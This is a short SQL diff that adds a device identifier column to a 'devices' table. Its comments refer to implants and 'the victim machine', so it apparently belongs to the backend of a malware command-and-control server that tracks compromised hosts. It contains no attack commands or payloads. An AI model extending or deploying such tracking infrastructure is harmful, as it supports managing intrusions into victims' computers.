@@ -2,6 +2,7 @@ CREATE TABLE devices (
     id              INT                                                                     NOT NULL AUTO_INCREMENT PRIMARY KEY,
 
     -- identity
+    device_id       VARCHAR(255)                                                            NOT NULL, -- id sended each time by device to track devices
     program_id      INT                                                                     NOT NULL, -- which implant is running
     hostname        VARCHAR(255)                                                            NULL,
     username        VARCHAR(255)                                                            NULL, -- logged-in user on the victim machine
